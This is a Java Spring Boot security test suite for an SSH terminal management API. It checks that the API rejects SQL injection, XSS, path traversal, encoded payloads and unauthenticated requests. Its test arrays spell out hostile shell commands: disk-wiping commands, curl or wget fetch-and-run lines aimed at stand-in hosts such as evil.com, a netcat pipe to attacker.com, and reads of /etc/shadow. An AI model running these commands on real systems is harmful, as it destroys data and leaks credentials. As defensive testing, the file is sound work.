package com.fufu.terminal.security;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fufu.terminal.entity.AtomicScript;
import com.fufu.terminal.entity.enums.ScriptType;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureWebMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * SSH Terminal Management System 安全测试
 * 测试系统的安全防护措施和漏洞防范
 */
@SpringBootTest
@AutoConfigureWebMvc
class SshTerminalSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @Test
    void testSqlInjectionPrevention() throws Exception {
        // Test SQL injection in script name
        AtomicScript maliciousScript = new AtomicScript();
        maliciousScript.setName("Test'; DROP TABLE atomic_scripts; --");
        maliciousScript.setScriptContent("echo 'test'");
        maliciousScript.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(maliciousScript)))
                .andExpect(status().isBadRequest()); // Should be rejected by validation

        // Test SQL injection in search parameter
        mockMvc.perform(get("/api/admin/atomic-scripts/search")
                .param("keyword", "test'; DROP TABLE atomic_scripts; --"))
                .andExpect(status().isOk()); // Should not cause SQL injection
    }

    @Test
    void testXssPreventionInScriptContent() throws Exception {
        AtomicScript xssScript = new AtomicScript();
        xssScript.setName("XSS Test Script");
        xssScript.setScriptContent("<script>alert('XSS')</script>");
        xssScript.setScriptType(ScriptType.BASH);

        // This should be allowed as script content but properly escaped when displayed
        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssScript)))
                .andExpect(status().isOk());
    }

    @Test
    void testCommandInjectionPrevention() throws Exception {
        String[] dangerousCommands = {
            "rm -rf /",
            "format c:",
            "del /f /q c:\\*",
            "deltree c:\\",
            "shutdown -h now",
            "reboot",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "fdisk /dev/sda",
            "parted /dev/sda rm 1",
            "chmod 777 /etc/passwd",
            "chown root:root /etc/shadow",
            "curl http://malicious.site/script.sh | bash",
            "wget -O - http://malicious.site/malware | sh",
            "$(curl -s http://malicious.site/payload)",
            "`wget -q -O - http://evil.com/script`",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "history | grep password"
        };

        for (String dangerousCommand : dangerousCommands) {
            AtomicScript maliciousScript = new AtomicScript();
            maliciousScript.setName("Malicious Script");
            maliciousScript.setScriptContent(dangerousCommand);
            maliciousScript.setScriptType(ScriptType.BASH);

            mockMvc.perform(post("/api/admin/atomic-scripts")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(maliciousScript)))
                    .andExpect(status().isBadRequest()); // Should be blocked
        }
    }

    @Test
    void testPathTraversalPrevention() throws Exception {
        // Test path traversal in script content
        AtomicScript pathTraversalScript = new AtomicScript();
        pathTraversalScript.setName("Path Traversal Test");
        pathTraversalScript.setScriptContent("cat ../../../../etc/passwd");
        pathTraversalScript.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(pathTraversalScript)))
                .andExpect(status().isBadRequest()); // Should be blocked

        // Test path traversal in file operations
        mockMvc.perform(get("/api/admin/atomic-scripts/../../../etc/passwd"))
                .andExpect(status().isNotFound()); // Should not allow path traversal
    }

    @Test
    void testInputValidationLimits() throws Exception {
        // Test extremely long script name
        StringBuilder longName = new StringBuilder();
        for (int i = 0; i < 1000; i++) {
            longName.append("a");
        }

        AtomicScript longNameScript = new AtomicScript();
        longNameScript.setName(longName.toString());
        longNameScript.setScriptContent("echo 'test'");
        longNameScript.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(longNameScript)))
                .andExpect(status().isBadRequest()); // Should be rejected due to length

        // Test extremely long script content
        StringBuilder longContent = new StringBuilder();
        for (int i = 0; i < 20000; i++) {
            longContent.append("echo 'test'; ");
        }

        AtomicScript longContentScript = new AtomicScript();
        longContentScript.setName("Long Content Test");
        longContentScript.setScriptContent(longContent.toString());
        longContentScript.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(longContentScript)))
                .andExpect(status().isBadRequest()); // Should be rejected due to length
    }

    @Test
    void testSpecialCharacterHandling() throws Exception {
        String[] specialCharacters = {
            "'; echo 'injected'; #",
            "&& rm -rf /tmp/*",
            "|| cat /etc/passwd",
            "| nc attacker.com 1337",
            "> /etc/passwd",
            "< /dev/urandom",
            "$((echo exploit))",
            "`id`",
            "$(whoami)",
            "${PATH}",
            "\\x41\\x41\\x41\\x41"
        };

        for (String specialChar : specialCharacters) {
            AtomicScript specialCharScript = new AtomicScript();
            specialCharScript.setName("Special Char Test");
            specialCharScript.setScriptContent("echo 'before' " + specialChar + " echo 'after'");
            specialCharScript.setScriptType(ScriptType.BASH);

            // Most of these should be blocked by security validation
            mockMvc.perform(post("/api/admin/atomic-scripts")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(specialCharScript)))
                    .andExpect(status().isBadRequest());
        }
    }

    @Test
    void testAuthenticationBypass() throws Exception {
        // Test accessing admin endpoints without authentication
        mockMvc.perform(get("/api/admin/atomic-scripts"))
                .andExpect(status().isUnauthorized()); // Should require authentication

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{}"))
                .andExpect(status().isUnauthorized()); // Should require authentication

        // Test accessing user endpoints without authentication
        mockMvc.perform(get("/api/user/scripts"))
                .andExpect(status().isUnauthorized()); // Should require authentication
    }

    @Test
    void testRateLimitingSimulation() throws Exception {
        // Simulate rapid requests to test rate limiting
        for (int i = 0; i < 100; i++) {
            try {
                mockMvc.perform(get("/api/health"))
                        .andExpect(status().isOk());
            } catch (Exception e) {
                // If rate limiting is in place, some requests might fail
                // This is expected behavior
            }
        }
    }

    @Test
    void testCsrfProtection() throws Exception {
        // Test POST request without CSRF token
        AtomicScript testScript = new AtomicScript();
        testScript.setName("CSRF Test Script");
        testScript.setScriptContent("echo 'test'");
        testScript.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(testScript)))
                .andExpect(status().isUnauthorized()); // Should require CSRF token and authentication
    }

    @Test
    void testFileUploadSecurity() throws Exception {
        // Test malicious file upload attempts
        String maliciousContent = "#!/bin/bash\nrm -rf /";
        
        mockMvc.perform(multipart("/api/admin/scripts/upload")
                .file("script", maliciousContent.getBytes())
                .param("filename", "malicious.sh"))
                .andExpect(status().isUnauthorized()); // Should require authentication

        // Test file with dangerous extension
        mockMvc.perform(multipart("/api/admin/scripts/upload")
                .file("script", "test content".getBytes())
                .param("filename", "test.exe"))
                .andExpect(status().isUnauthorized()); // Should require authentication and validate file type
    }

    @Test
    void testSessionManagement() throws Exception {
        // Test session fixation protection
        // Test session timeout
        // Test concurrent sessions
        // These tests would require proper session management setup
    }

    @Test
    void testDataSanitization() throws Exception {
        // Test HTML tags in script names
        AtomicScript htmlScript = new AtomicScript();
        htmlScript.setName("<b>Bold Script</b>");
        htmlScript.setScriptContent("echo 'test'");
        htmlScript.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(htmlScript)))
                .andExpect(status().isOk()); // Should accept but sanitize HTML

        // Test JavaScript in descriptions
        AtomicScript jsScript = new AtomicScript();
        jsScript.setName("JS Test Script");
        jsScript.setDescription("javascript:alert('XSS')");
        jsScript.setScriptContent("echo 'test'");
        jsScript.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(jsScript)))
                .andExpect(status().isOk()); // Should accept but sanitize JavaScript
    }

    @Test
    void testEncodingAttacks() throws Exception {
        // Test URL encoding attacks
        String encodedPayload = "%72%6D%20%2D%72%66%20%2F"; // "rm -rf /" URL encoded

        AtomicScript encodedScript = new AtomicScript();
        encodedScript.setName("Encoded Attack Test");
        encodedScript.setScriptContent(encodedPayload);
        encodedScript.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(encodedScript)))
                .andExpect(status().isBadRequest()); // Should decode and block dangerous content

        // Test Base64 encoded attacks
        String base64Payload = java.util.Base64.getEncoder().encodeToString("rm -rf /".getBytes());

        AtomicScript base64Script = new AtomicScript();
        base64Script.setName("Base64 Attack Test");
        base64Script.setScriptContent("echo " + base64Payload + " | base64 -d | bash");
        base64Script.setScriptType(ScriptType.BASH);

        mockMvc.perform(post("/api/admin/atomic-scripts")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(base64Script)))
                .andExpect(status().isBadRequest()); // Should detect and block
    }

    @Test
    void testResourceExhaustion() throws Exception {
        // Test creating many resources rapidly
        for (int i = 0; i < 50; i++) {
            AtomicScript script = new AtomicScript();
            script.setName("Resource Test " + i);
            script.setScriptContent("echo 'test'");
            script.setScriptType(ScriptType.BASH);

            mockMvc.perform(post("/api/admin/atomic-scripts")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(script)))
                    .andExpect(status().isUnauthorized()); // Blocked by authentication, but tests resource handling
        }
    }
}